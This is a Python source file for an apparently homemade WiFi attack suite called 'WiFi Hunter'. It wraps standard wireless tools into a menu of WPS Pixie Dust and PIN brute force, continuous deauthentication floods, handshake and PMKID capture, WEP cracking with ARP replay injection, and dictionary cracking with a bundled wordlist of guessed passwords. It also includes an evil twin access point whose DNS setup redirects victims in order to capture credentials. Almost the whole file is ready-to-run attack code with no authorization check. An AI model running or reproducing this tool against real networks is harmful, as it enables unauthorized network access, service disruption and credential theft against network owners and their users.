#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════╗
# ║          WiFi Hunter v1.0 — Full WiFi Attack & Recon Suite           ║
# ║          Author : ‌‌SAKIB                                         ║
# ║          Mode   : Scanner · WPS · Handshake · PMKID · Crack          ║
# ╚══════════════════════════════════════════════════════════════════════╝

import os, sys, time, subprocess, re, json, threading, signal
from datetime import datetime

# ════════════════════════════════════════════════════════════════════
#  COLORS
# ════════════════════════════════════════════════════════════════════
R  = "\033[0m"
G1 = "\033[38;5;46m"
G2 = "\033[38;5;40m"
G3 = "\033[38;5;34m"
W  = "\033[1;37m"
DW = "\033[0;37m"
RD = "\033[1;31m"
YL = "\033[1;33m"
CY = "\033[1;36m"
MG = "\033[1;35m"
BL = "\033[1;34m"
DM = "\033[2m"
BD = "\033[1m"

# ════════════════════════════════════════════════════════════════════
#  STATUS HELPERS
# ════════════════════════════════════════════════════════════════════
def ok(m):    print(f"  {G1}[+]{R} {W}{m}{R}")
def info(m):  print(f"  {G2}[*]{R} {DW}{m}{R}")
def warn(m):  print(f"  {YL}[!]{R} {DW}{m}{R}")
def err(m):   print(f"  {RD}[✗]{R} {DW}{m}{R}")
def step(m):  print(f"  {G3}[→]{R} {DW}{m}{R}")
def hit(m):   print(f"  {CY}[★]{R} {CY}{BD}{m}{R}")
def vuln(m):  print(f"  {RD}[⚠]{R} {RD}{BD}{m}{R}")
def found(m): print(f"  {G1}[✔]{R} {G1}{BD}{m}{R}")

def section(t):
    pad = max(0, 50 - len(t))
    print(f"\n{G2}  ╔══ {G1}{t}{G2} {'═'*pad}╗{R}")

def section_end():
    print(f"{G2}  ╚{'═'*56}╝{R}\n")

def line():
    print(f"  {G3}{'─'*54}{R}")

# ════════════════════════════════════════════════════════════════════
#  BANNER
# ════════════════════════════════════════════════════════════════════
def banner():
    os.system("clear")
    print(f"""
{G1}  ██╗    ██╗██╗███████╗██╗    ██╗  ██╗{R}
{G1}  ██║    ██║██║██╔════╝██║    ██║  ██║{R}
{G2}  ██║ █╗ ██║██║█████╗  ██║    ███████║{R}
{G2}  ██║███╗██║██║██╔══╝  ██║    ╚════██║{R}
{G3}  ╚███╔███╔╝██║██║     ██║         ██║{R}
{G3}   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝         ╚═╝{R}

{G1}  ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ {R}
{G2}  ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗{R}
{G2}  ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝{R}
{G3}  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗{R}
{G3}  ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║{R}
{G3}  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝{R}

{G2}  ╔══════════════════════════════════════════════════════╗{R}
{G2}  ║  {W}Tool    : {G1}WiFi Hunter v1.0                      {G2}║{R}
{G2}  ║  {W}Author  : {G1} SAKIB                           {G2}║{R}
{G2}  ║  {W}Modules : {G1}Scan·WPS·HS·PMKID·Crack·Monitor·AP   {G2}║{R}
{G2}  ╚══════════════════════════════════════════════════════╝{R}
""")

# ════════════════════════════════════════════════════════════════════
#  TOOL CHECKER
# ════════════════════════════════════════════════════════════════════
REQUIRED_TOOLS = {
    "aircrack-ng":   "pkg install aircrack-ng",
    "airodump-ng":   "pkg install aircrack-ng",
    "aireplay-ng":   "pkg install aircrack-ng",
    "reaver":        "pkg install reaver",
    "bully":         "pkg install bully",
    "hcxdumptool":   "pkg install hcxdumptool",
    "hcxtools":      "pkg install hcxtools",
    "wash":          "pkg install reaver",
    "iw":            "pkg install iw",
    "hashcat":       "pkg install hashcat",
}

def check_tool(tool):
    r = subprocess.run(["which", tool], capture_output=True, text=True)
    return r.returncode == 0

def check_root():
    return os.geteuid() == 0

def check_dependencies():
    section("DEPENDENCY CHECK")
    missing = []
    for tool, install_cmd in REQUIRED_TOOLS.items():
        if check_tool(tool):
            ok(f"{tool:<20} {G1}✓ Found{R}")
        else:
            err(f"{tool:<20} {RD}✗ Missing{R}  →  {DM}{install_cmd}{R}")
            missing.append((tool, install_cmd))
    section_end()
    if missing:
        warn(f"{len(missing)} tools missing. Install with:")
        print(f"\n  {G2}pkg install aircrack-ng reaver bully hcxdumptool hcxtools iw{R}\n")
    else:
        ok("All tools ready!")
    return len(missing) == 0

# ════════════════════════════════════════════════════════════════════
#  INTERFACE MANAGER
# ════════════════════════════════════════════════════════════════════
def get_interfaces():
    ifaces = []
    try:
        # Method 1: ip link
        r = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
        ifaces = re.findall(r'\d+: (wlan\w+|ap\w+|p2p\w+)', r.stdout)
    except: pass
    if not ifaces:
        try:
            # Method 2: ls /sys/class/net
            r = subprocess.run(["ls", "/sys/class/net"], capture_output=True, text=True)
            for n in r.stdout.split():
                if n.startswith(("wlan","ap","p2p")): ifaces.append(n)
        except: pass
    return ifaces if ifaces else ["wlan0"]

def get_monitor_interfaces():
    try:
        r = subprocess.run(["iwconfig"], capture_output=True, text=True)
        monitors = re.findall(r'(\w+)\s+.*?Mode:Monitor', r.stdout, re.DOTALL)
        return monitors
    except:
        return []

def enable_monitor_mode(iface):
    section(f"MONITOR MODE → {iface}")
    # Try airmon-ng first
    if check_tool("airmon-ng"):
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        r = subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True)
        ok(f"airmon-ng start {iface}")
        # check if wlan0mon created
        mon_iface = iface + "mon"
        rr = subprocess.run(["ip", "link", "show", mon_iface], capture_output=True)
        if rr.returncode == 0:
            ok(f"Monitor interface: {mon_iface}")
            section_end()
            return mon_iface
    # Try iw fallback
    if check_tool("iw"):
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
        subprocess.run(["iw", iface, "set", "monitor", "none"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    ok(f"Monitor mode → {iface}")
    section_end()
    return iface

def disable_monitor_mode(iface):
    if check_tool("airmon-ng"):
        subprocess.run(["airmon-ng", "stop", iface], capture_output=True)
    elif check_tool("iw"):
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
        subprocess.run(["iw", iface, "set", "type", "managed"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    ok(f"Monitor mode disabled → {iface}")

# ════════════════════════════════════════════════════════════════════
#  MODULE 1 — WiFi SCANNER
# ════════════════════════════════════════════════════════════════════
def wifi_scanner():
    section("WiFi SCANNER")
    networks = []

    # Method 1: termux-wifi-scaninfo (no root, no iw needed)
    info("Scanning via Termux API...")
    try:
        r = subprocess.run(
            ["termux-wifi-scaninfo"],
            capture_output=True, text=True, timeout=15
        )
        if r.returncode == 0 and r.stdout.strip():
            data = json.loads(r.stdout)
            for ap in data:
                net = {}
                net["ssid"]    = ap.get("ssid","<hidden>").strip('"') or "<hidden>"
                net["bssid"]   = ap.get("bssid","??").upper()
                net["signal"]  = str(ap.get("level","??"))
                net["freq"]    = str(ap.get("frequency","??"))
                net["channel"] = str(freq_to_channel(int(ap.get("frequency",2412))))
                cap = ap.get("capabilities","")
                net["enc"]     = "WPA2" if "WPA2" in cap else ("WPA" if "WPA" in cap else ("WEP" if "WEP" in cap else "OPEN"))
                net["wps"]     = "WPS" in cap
                networks.append(net)
            ok(f"Termux API scan: {len(networks)} networks")
    except FileNotFoundError:
        warn("termux-wifi-scaninfo not found. Install: pkg install termux-api")
        warn("Also install Termux:API app from F-Droid")
    except Exception as e:
        warn(f"Termux API scan failed: {e}")

    # Method 2: iw scan (root)
    if not networks:
        ifaces = get_interfaces()
        info(f"Trying iw scan on: {', '.join(ifaces)}")
        iface = ifaces[0] if ifaces else "wlan0"
        try:
            r = subprocess.run(["iw", iface, "scan"],
                capture_output=True, text=True, timeout=20)
            if r.stdout:
                for block in r.stdout.split("BSS ")[1:]:
                    net = {}
                    bssid = re.search(r'^([0-9a-f:]{17})', block)
                    ssid  = re.search(r'SSID: (.+)', block)
                    signal= re.search(r'signal: ([-\d.]+)', block)
                    freq  = re.search(r'freq: (\d+)', block)
                    net["bssid"]   = bssid.group(1).upper() if bssid else "??"
                    net["ssid"]    = ssid.group(1).strip() if ssid else "<hidden>"
                    net["signal"]  = signal.group(1) if signal else "??"
                    net["freq"]    = freq.group(1) if freq else "2412"
                    net["channel"] = str(freq_to_channel(int(net["freq"]))) if net["freq"].isdigit() else "?"
                    net["enc"]     = "WPA2" if "RSN" in block else ("WPA" if "WPA" in block else "OPEN")
                    net["wps"]     = "WPS" in block
                    networks.append(net)
        except Exception as e:
            warn(f"iw scan: {e}")

    # Method 3: termux-wifi-connectioninfo (single network fallback)
    if not networks:
        info("Trying connection info fallback...")
        try:
            r = subprocess.run(["termux-wifi-connectioninfo"],
                capture_output=True, text=True, timeout=10)
            if r.returncode == 0 and r.stdout.strip():
                d = json.loads(r.stdout)
                if d.get("bssid"):
                    net = {
                        "ssid":    d.get("ssid","<hidden>").strip('"'),
                        "bssid":   d.get("bssid","??").upper(),
                        "signal":  str(d.get("rssi","??")),
                        "freq":    str(d.get("frequency_mhz",2412)),
                        "channel": "?",
                        "enc":     "WPA2",
                        "wps":     False,
                    }
                    networks.append(net)
                    info("Connected network added (limited scan)")
        except Exception as e:
            warn(f"Connection info fallback: {e}")

    if not networks:
        err("No networks found. Try with root or check your interface.")
        section_end()
        return []

    # Display
    section_end()
    section(f"NETWORKS FOUND ({len(networks)})")
    print(f"\n  {G2}{'#':<4} {'BSSID':<20} {'SSID':<28} {'CH':<4} {'ENC':<10} {'SIG':<8} {'WPS'}{R}")
    line()
    for i, n in enumerate(networks, 1):
        wps_tag = f"{G1}[WPS]{R}" if n["wps"] else f"{DM}     {R}"
        sig = n["signal"]
        sig_color = G1 if str(sig).lstrip("-").isdigit() and int(str(sig).split(".")[0]) > -60 else (YL if str(sig).lstrip("-").isdigit() and int(str(sig).split(".")[0]) > -75 else RD)
        enc_color = RD if "OPEN" in n["enc"] else (YL if "WEP" in n["enc"] else G2)
        print(f"  {G3}{i:<4}{R} {CY}{n['bssid']:<20}{R} {W}{n['ssid'][:27]:<28}{R} "
              f"{G2}{n['channel']:<4}{R} {enc_color}{n['enc']:<10}{R} {sig_color}{sig:<8}{R} {wps_tag}")

    section_end()
    ok(f"Scan complete — {len(networks)} networks")
    save_scan_results(networks)
    return networks

def freq_to_channel(freq):
    if 2412 <= freq <= 2484:
        return 14 if freq == 2484 else (freq - 2412) // 5 + 1
    elif 5170 <= freq <= 5825:
        return (freq - 5170) // 5 + 34
    return 0

def channel_to_freq(ch):
    if 1 <= ch <= 13: return 2412 + (ch-1)*5
    if ch == 14: return 2484
    return 5170 + (ch-34)*5

def save_scan_results(networks):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"wifi_scan_{ts}.json"
    with open(fname, "w") as f:
        json.dump(networks, f, indent=2)
    step(f"Saved → {fname}")

# ════════════════════════════════════════════════════════════════════
#  MODULE 2 — WPS SCAN (wash)
# ════════════════════════════════════════════════════════════════════
def wps_scan():
    section("WPS SCANNER (wash)")
    if not check_tool("wash"):
        err("wash not found. Install: pkg install reaver")
        section_end(); return

    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    mon = enable_monitor_mode(iface)
    info(f"Running wash on {mon} for 15 seconds...")

    try:
        proc = subprocess.Popen(
            ["wash", "-i", mon, "--scan"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        time.sleep(15)
        proc.terminate()
        out, _ = proc.communicate(timeout=3)

        wps_nets = []
        for line_text in out.splitlines():
            if re.search(r'[0-9a-fA-F:]{17}', line_text):
                wps_nets.append(line_text.strip())
                print(f"  {G1}[WPS]{R} {CY}{line_text.strip()}{R}")

        section_end()
        ok(f"WPS networks found: {len(wps_nets)}")
        disable_monitor_mode(mon)
    except Exception as e:
        err(f"wash error: {e}")
        section_end()

# ════════════════════════════════════════════════════════════════════
#  MODULE 3 — WPS ATTACK (Pixie Dust / PIN Brute)
# ════════════════════════════════════════════════════════════════════
def wps_attack():
    section("WPS ATTACK")
    if not (check_tool("reaver") or check_tool("bully")):
        err("reaver/bully not found. Install: pkg install reaver bully")
        section_end(); return

    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    print(f"  {G1}Target BSSID{R} (xx:xx:xx:xx:xx:xx): ", end="")
    bssid = input().strip().upper()
    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
        err("Invalid BSSID format"); section_end(); return

    print(f"  {G1}Channel{R}: ", end="")
    channel = input().strip() or "6"

    print(f"""
{G2}  ╔══ Attack Mode ══════════════════════════════════════╗{R}
{G2}  ║  {G1}[1]{W} Pixie Dust Attack  (fast, automatic)      {G2}║{R}
{G2}  ║  {G1}[2]{W} WPS PIN Brute Force (slow, thorough)      {G2}║{R}
{G2}  ║  {G1}[3]{W} Null PIN Attack     (instant check)       {G2}║{R}
{G2}  ║  {G1}[4]{W} Bully Pixie Dust    (alternative engine)  {G2}║{R}
{G2}  ╚═════════════════════════════════════════════════════╝{R}""")
    print(f"  {G1}Choice{R}: ", end="")
    choice = input().strip()

    mon = enable_monitor_mode(iface)
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = f"wps_{bssid.replace(':','')}_{ts}"

    section_end()
    info(f"Target: {bssid}  Channel: {channel}  Interface: {mon}")

    try:
        if choice == "1":
            info("Pixie Dust Attack started...")
            cmd = ["reaver", "-i", mon, "-b", bssid, "-c", channel,
                   "-K", "1", "-vv", "-o", out_file + ".log"]
        elif choice == "2":
            info("WPS PIN Brute Force started (this takes time)...")
            cmd = ["reaver", "-i", mon, "-b", bssid, "-c", channel,
                   "-vv", "-o", out_file + ".log"]
        elif choice == "3":
            info("Null PIN Attack...")
            cmd = ["reaver", "-i", mon, "-b", bssid, "-c", channel,
                   "-p", "", "-vv"]
        elif choice == "4":
            info("Bully Pixie Dust...")
            cmd = ["bully", mon, "-b", bssid, "-c", channel, "-d", "-v", "3"]
        else:
            warn("Invalid choice"); disable_monitor_mode(mon); return

        warn("Press Ctrl+C to stop attack")
        print()
        proc = subprocess.run(cmd)
        section_end()
        ok("Attack finished. Check output file: " + out_file + ".log")

    except KeyboardInterrupt:
        ok("Attack stopped by user.")
    finally:
        disable_monitor_mode(mon)

# ════════════════════════════════════════════════════════════════════
#  MODULE 4 — HANDSHAKE CAPTURE
# ════════════════════════════════════════════════════════════════════
def handshake_capture():
    section("HANDSHAKE CAPTURE")
    if not check_tool("airodump-ng"):
        err("airodump-ng not found. Install: pkg install aircrack-ng")
        section_end(); return

    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    print(f"  {G1}Target BSSID{R}: ", end="")
    bssid = input().strip().upper()

    print(f"  {G1}Channel{R}: ", end="")
    channel = input().strip() or "6"

    print(f"  {G1}Output file name{R} (no extension): ", end="")
    out_name = input().strip() or f"capture_{datetime.now().strftime('%H%M%S')}"

    mon = enable_monitor_mode(iface)
    info(f"Capturing on channel {channel} targeting {bssid}...")
    info("Waiting for handshake (Ctrl+C to stop capture)...")

    try:
        capture_proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--write", out_name,
            "--output-format", "pcap",
            mon
        ])

        # Deauth to force reconnect after 5 seconds
        time.sleep(5)
        warn("Sending deauth packets to force handshake...")
        subprocess.run([
            "aireplay-ng",
            "--deauth", "10",
            "-a", bssid,
            mon
        ], capture_output=True)

        capture_proc.wait()

    except KeyboardInterrupt:
        try: capture_proc.terminate()
        except: pass
        ok(f"Capture stopped. Files: {out_name}-01.cap")

    finally:
        disable_monitor_mode(mon)

    # check if handshake captured
    cap_file = out_name + "-01.cap"
    if os.path.exists(cap_file):
        r = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True
        )
        if "WPA" in r.stdout and "handshake" in r.stdout.lower():
            hit(f"HANDSHAKE CAPTURED → {cap_file}")
        else:
            warn(f"File saved but handshake not confirmed: {cap_file}")
    section_end()

# ════════════════════════════════════════════════════════════════════
#  MODULE 5 — DEAUTH ATTACK
# ════════════════════════════════════════════════════════════════════
def deauth_attack():
    section("DEAUTH ATTACK")
    if not check_tool("aireplay-ng"):
        err("aireplay-ng not found. Install: pkg install aircrack-ng")
        section_end(); return

    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    print(f"  {G1}Target AP BSSID{R}: ", end="")
    bssid = input().strip().upper()

    print(f"  {G1}Client MAC {DM}(FF:FF:FF:FF:FF:FF = broadcast){R}: ", end="")
    client = input().strip().upper() or "FF:FF:FF:FF:FF:FF"

    print(f"  {G1}Packets {DM}(0 = continuous){R}: ", end="")
    packets = input().strip() or "0"

    mon = enable_monitor_mode(iface)
    info(f"Deauth → AP: {bssid}  Client: {client}  Packets: {packets}")
    warn("Press Ctrl+C to stop")

    try:
        cmd = ["aireplay-ng", "--deauth", packets,
               "-a", bssid, "-c", client, mon]
        subprocess.run(cmd)
    except KeyboardInterrupt:
        ok("Deauth stopped.")
    finally:
        disable_monitor_mode(mon)
    section_end()

# ════════════════════════════════════════════════════════════════════
#  MODULE 6 — PMKID ATTACK
# ════════════════════════════════════════════════════════════════════
def pmkid_attack():
    section("PMKID ATTACK (hcxdumptool)")
    if not check_tool("hcxdumptool"):
        err("hcxdumptool not found. Install: pkg install hcxdumptool")
        section_end(); return

    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    print(f"  {G1}Target BSSID {DM}(blank = all networks){R}: ", end="")
    bssid = input().strip().upper()

    print(f"  {G1}Capture time (seconds){R}: ", end="")
    secs = input().strip() or "60"

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_file = f"pmkid_{ts}.pcapng"
    hash_file = f"pmkid_{ts}.hc22000"

    info(f"Capturing PMKID for {secs}s → {cap_file}")
    warn("Root required for hcxdumptool")

    cmd = ["hcxdumptool", "-i", iface, "-o", cap_file,
           "--enable_status=3", f"--timeout={secs}"]
    if bssid:
        # write filterlist
        with open("pmkid_filter.txt", "w") as f:
            f.write(bssid.replace(":", "").lower() + "\n")
        cmd += ["--filterlist_ap=pmkid_filter.txt", "--filtermode=2"]

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        ok("PMKID capture stopped.")

    if os.path.exists(cap_file):
        ok(f"Captured: {cap_file}")
        # convert to hashcat format
        if check_tool("hcxpcapngtool"):
            r = subprocess.run(
                ["hcxpcapngtool", "-o", hash_file, cap_file],
                capture_output=True
            )
            if os.path.exists(hash_file):
                hit(f"Hash file ready: {hash_file}")
                info("Crack with: hashcat -m 22000 " + hash_file + " wordlist.txt")
        else:
            warn("hcxpcapngtool not found. Install hcxtools to convert.")
    section_end()

# ════════════════════════════════════════════════════════════════════
#  MODULE 7 — PASSWORD CRACKER
# ════════════════════════════════════════════════════════════════════
def password_cracker():
    section("WiFi PASSWORD CRACKER")
    print(f"""
{G2}  ╔══ Cracker Engine ═══════════════════════════════════╗{R}
{G2}  ║  {G1}[1]{W} Aircrack-ng (Handshake .cap file)        {G2}║{R}
{G2}  ║  {G1}[2]{W} Hashcat     (PMKID .hc22000 file)        {G2}║{R}
{G2}  ╚═════════════════════════════════════════════════════╝{R}""")
    print(f"  {G1}Choice{R}: ", end="")
    choice = input().strip()

    if choice == "1":
        if not check_tool("aircrack-ng"):
            err("aircrack-ng not found"); return

        print(f"\n  {G1}Handshake file (.cap){R}: ", end="")
        cap = input().strip()
        if not os.path.exists(cap):
            err(f"File not found: {cap}"); return

        print(f"  {G1}Wordlist file{R}: ", end="")
        wordlist = input().strip()

        # built-in mini wordlist if not found
        if not os.path.exists(wordlist):
            warn(f"Wordlist not found. Creating default wordlist...")
            wordlist = create_default_wordlist()

        print(f"  {G1}BSSID (target AP){R}: ", end="")
        bssid = input().strip()

        info(f"Cracking: {cap} with {wordlist}...")
        cmd = ["aircrack-ng", cap, "-w", wordlist]
        if bssid: cmd += ["-b", bssid]

        try:
            proc = subprocess.run(cmd)
        except KeyboardInterrupt:
            ok("Cracking stopped.")

    elif choice == "2":
        if not check_tool("hashcat"):
            err("hashcat not found. Install: pkg install hashcat"); return

        print(f"\n  {G1}Hash file (.hc22000){R}: ", end="")
        hashfile = input().strip()
        if not os.path.exists(hashfile):
            err(f"File not found: {hashfile}"); return

        print(f"  {G1}Wordlist file{R}: ", end="")
        wordlist = input().strip()
        if not os.path.exists(wordlist):
            wordlist = create_default_wordlist()

        info(f"Hashcat cracking: {hashfile}...")
        cmd = ["hashcat", "-m", "22000", hashfile, wordlist,
               "--force", "--status"]
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            ok("Cracking stopped.")
    section_end()

def create_default_wordlist():
    fname = "default_wordlist.txt"
    passwords = [
        "password","12345678","123456789","1234567890",
        "password123","admin123","qwerty123","abc12345",
        "iloveyou","monkey123","dragon","master",
        "letmein","football","shadow","sunshine",
        "princess","admin","welcome","login",
        "passw0rd","p@ssw0rd","p@ssword","Pa$$word",
        "00000000","11111111","12341234","99999999",
        "bangladesh","dhaka1234","bd12345","bangla",
        "01700000000","01800000000","01900000000",
    ]
    with open(fname, "w") as f:
        f.write("\n".join(passwords))
    ok(f"Default wordlist created: {fname} ({len(passwords)} passwords)")
    return fname

# ════════════════════════════════════════════════════════════════════
#  MODULE 8 — EVIL TWIN AP
# ════════════════════════════════════════════════════════════════════
def evil_twin():
    section("EVIL TWIN AP")
    info("Creates a fake AP with same SSID to capture credentials")
    warn("Requires: hostapd + dnsmasq")

    for tool in ["hostapd", "dnsmasq"]:
        if not check_tool(tool):
            err(f"{tool} not found. Install: pkg install {tool}")
            section_end(); return

    print(f"\n  {G1}AP Name (SSID){R}: ", end="")
    ssid = input().strip() or "FreeWiFi"

    print(f"  {G1}Interface{R}: ", end="")
    iface = input().strip() or "wlan0"

    print(f"  {G1}Channel{R}: ", end="")
    channel = input().strip() or "6"

    # write hostapd config
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
ignore_broadcast_ssid=0
"""
    # write dnsmasq config
    dnsmasq_conf = f"""interface={iface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
"""
    with open("/tmp/hostapd_evil.conf", "w") as f: f.write(hostapd_conf)
    with open("/tmp/dnsmasq_evil.conf", "w") as f: f.write(dnsmasq_conf)

    info(f"Starting Evil Twin: SSID={ssid} CH={channel}")
    info("Starting dnsmasq...")
    subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq_evil.conf"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    warn("Starting hostapd (Ctrl+C to stop)...")
    try:
        subprocess.run(["hostapd", "/tmp/hostapd_evil.conf"])
    except KeyboardInterrupt:
        ok("Evil Twin stopped.")
        subprocess.run(["pkill", "dnsmasq"], capture_output=True)
        subprocess.run(["pkill", "hostapd"], capture_output=True)
    section_end()

# ════════════════════════════════════════════════════════════════════
#  MODULE 9 — NETWORK MONITOR
# ════════════════════════════════════════════════════════════════════
def network_monitor():
    section("NETWORK MONITOR")
    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    print(f"  {G1}Channel (0 = hop){R}: ", end="")
    channel = input().strip() or "0"

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = f"monitor_{ts}"
    mon = enable_monitor_mode(iface)

    info(f"Monitoring on {mon}...")
    warn("Press Ctrl+C to stop")

    cmd = ["airodump-ng", mon]
    if channel != "0":
        cmd += ["-c", channel]
    cmd += ["--write", out_file, "--output-format", "csv"]

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        ok(f"Monitor stopped. Data: {out_file}-01.csv")
    finally:
        disable_monitor_mode(mon)
    section_end()

# ════════════════════════════════════════════════════════════════════
#  MODULE 10 — WEP CRACK
# ════════════════════════════════════════════════════════════════════
def wep_crack():
    section("WEP CRACK")
    if not check_tool("airodump-ng"):
        err("aircrack-ng suite not found"); section_end(); return

    ifaces = get_interfaces()
    print(f"\n  {G1}Interface{R}: ", end="")
    iface = input().strip() or (ifaces[0] if ifaces else "wlan0")

    print(f"  {G1}Target BSSID{R}: ", end="")
    bssid = input().strip().upper()

    print(f"  {G1}Channel{R}: ", end="")
    channel = input().strip() or "6"

    mon = enable_monitor_mode(iface)
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_file = f"wep_{ts}"

    info(f"Capturing IVs on {mon} targeting {bssid}...")
    warn("Ctrl+C when enough IVs collected (aim for 50000+)")

    # Capture IVs
    capture_proc = subprocess.Popen([
        "airodump-ng", "--bssid", bssid,
        "-c", channel, "--write", cap_file,
        "--output-format", "ivs", mon
    ])

    # ARP replay to accelerate
    time.sleep(5)
    info("Starting ARP replay injection...")
    replay_proc = subprocess.Popen([
        "aireplay-ng", "--arpreplay",
        "-b", bssid, mon
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        capture_proc.wait()
    except KeyboardInterrupt:
        try:
            capture_proc.terminate()
            replay_proc.terminate()
        except: pass
        ok("Capture stopped. Attempting crack...")

    disable_monitor_mode(mon)

    # Crack
    ivs = cap_file + "-01.ivs"
    if os.path.exists(ivs):
        info(f"Cracking {ivs}...")
        subprocess.run(["aircrack-ng", ivs])
    else:
        warn(f"IV file not found: {ivs}")
    section_end()

# ════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ════════════════════════════════════════════════════════════════════
def main_menu():
    banner()
    while True:
        print(f"""
{G2}  ╔══════════════════════════════════════════════════════╗{R}
{G2}  ║  {G1}[01]{W} WiFi Scanner          {DM}(iw / iwlist scan)   {G2}║{R}
{G2}  ║  {G1}[02]{W} WPS Scanner           {DM}(wash)               {G2}║{R}
{G2}  ║  {G1}[03]{W} WPS Attack            {DM}(reaver / bully)     {G2}║{R}
{G2}  ║  {G1}[04]{W} Handshake Capture     {DM}(airodump-ng)        {G2}║{R}
{G2}  ║  {G1}[05]{W} Deauth Attack         {DM}(aireplay-ng)        {G2}║{R}
{G2}  ║  {G1}[06]{W} PMKID Attack          {DM}(hcxdumptool)        {G2}║{R}
{G2}  ║  {G1}[07]{W} Password Cracker      {DM}(aircrack / hashcat) {G2}║{R}
{G2}  ║  {G1}[08]{W} Evil Twin AP          {DM}(hostapd + dnsmasq)  {G2}║{R}
{G2}  ║  {G1}[09]{W} Network Monitor       {DM}(airodump-ng)        {G2}║{R}
{G2}  ║  {G1}[10]{W} WEP Crack             {DM}(aircrack-ng + ARPreplay){G2}║{R}
{G2}  ║  {G1}[11]{W} Check Dependencies    {DM}(tool status)        {G2}║{R}
{G2}  ║  {G1}[00]{W} Exit                                          {G2}║{R}
{G2}  ╚══════════════════════════════════════════════════════╝{R}

  {G1}WiFi Hunter ❯❯ {R}""", end="")

        try:
            choice = input().strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n\n{G3}  WiFi Hunter — Session ended.{R}\n")
            sys.exit(0)

        actions = {
            "1": wifi_scanner,  "01": wifi_scanner,
            "2": wps_scan,      "02": wps_scan,
            "3": wps_attack,    "03": wps_attack,
            "4": handshake_capture, "04": handshake_capture,
            "5": deauth_attack, "05": deauth_attack,
            "6": pmkid_attack,  "06": pmkid_attack,
            "7": password_cracker, "07": password_cracker,
            "8": evil_twin,     "08": evil_twin,
            "9": network_monitor,  "09": network_monitor,
            "10": wep_crack,
            "11": check_dependencies,
            "0": sys.exit, "00": sys.exit,
        }

        action = actions.get(choice)
        if action:
            if choice in ("0", "00"):
                print(f"\n{G3}  WiFi Hunter — Session ended.{R}\n")
                sys.exit(0)
            try:
                action()
            except KeyboardInterrupt:
                warn("Module interrupted.")
            except Exception as e:
                err(f"Error: {e}")
        else:
            warn("Invalid choice. Try again.")

# ════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    if not check_root():
        warn("Not running as root. Some features need root.")
        warn("Run with: sudo python wifi_hunter.py")
        time.sleep(2)
    main_menu()
